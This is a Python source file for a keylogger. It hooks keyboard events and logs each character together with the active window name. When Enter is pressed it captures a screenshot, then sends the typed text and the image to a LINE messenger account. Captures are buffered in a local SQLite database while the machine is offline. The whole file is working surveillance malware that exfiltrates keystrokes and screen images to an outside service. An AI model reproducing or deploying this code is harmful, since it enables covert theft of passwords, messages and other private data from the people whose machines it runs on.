import socket
import time
import datetime
import pyautogui
import os
import conf
import sqlite3 as lite
from line import LineClient
from random import randint

keyboard_data = []
ascii_data = []

def sqlite_con():
	db = os.path.dirname(os.path.abspath(__file__))
	db = db.split("\\")[:-1] + ["blutrax.db"]
	db = "\\".join(db)
	con = lite.connect(db)
	return con

def insert(data):
	con = sqlite_con()
	with con:
		cur = con.cursor()
		cur.execute("INSERT INTO bludata VALUES(?, ?, ?, ?, ?)", data)

def delete():
	con = sqlite_con()
	with con:
		cur = con.cursor()
		cur.execute("DELETE FROM bludata;")

def fetching_db():
	con = sqlite_con()
	with con:
		cur = con.cursor()
		cur.execute("SELECT * FROM bludata")
		rows = cur.fetchall()
	cur.close()
	return rows

def is_online():
	try:
		host = socket.gethostbyname(conf.REMOTE_SERVER)
		s = socket.create_connection((host, 80), 2)
		return True
	except:
		pass
	return False


def get_image_basepath():
	"""Get image path."""
	return os.path.dirname(os.path.abspath(__file__))


def grab_desk_to_image(filename):
	"""Capturing dekstop and convert to image."""
	pyautogui.screenshot(get_image_basepath() + "\\images\\"+filename+".gif")
	return get_image_basepath()  + "\\images\\"+filename+".gif"

def send_to_line(message, image):
	"""Send message and image to Line Messanger."""
	try:
		client = LineClient(conf.LINE_USERNAME, conf.LINE_PASSWORD)
		myline = client.getProfile()
		myline.sendMessage(message)
		myline.sendImage(image)
		return True
	except:
		pass
	return False



def keyboard_tracking(event):
	"""Tracking keyboard."""
	global keyboard_data
	global ascii_data
	# get window name
	window_name = event.WindowName
	# append char Ascii to list keyboard_data
	keyboard_data.append(chr(event.Ascii))
	# append str numeric Ascii to list ascii_data
	ascii_data.append(str(event.Ascii))
	# get datetime now
	date = datetime.datetime.now()
	# if enter clicked (13 = ascii enter)
	if 13 == event.Ascii:
		# capturing window
		image_name = str(date).replace(":","-").replace(".","-")
		image = grab_desk_to_image(image_name+conf.KEYBOARD_PREFIX)
		# creating message
		text = "".join(keyboard_data).strip()
		num_ascii = "|".join(ascii_data)
		message = conf.MESSAGE_FORMAT.format(window_name, date, text, num_ascii)
		# clear data
		keyboard_data = []
		ascii_data = []
		# check online
		if is_online():
			# check if database contain data record
			if fetching_db():
				data = fetching_db()
				for d in data:
					image = d[3]
					message = conf.MESSAGE_FORMAT_DB_LINE.format(p=d)
					send_to_line(message, image)
			delete()
			# send keyboard data tracking in line messanger
			send_to_line(message, image)
		else:
			# inserting data tracking in database
			#print "send db"
			data = (randint(1, 999999999),text, num_ascii, image, date)
			insert(data)
			#sqlite_con()

	return True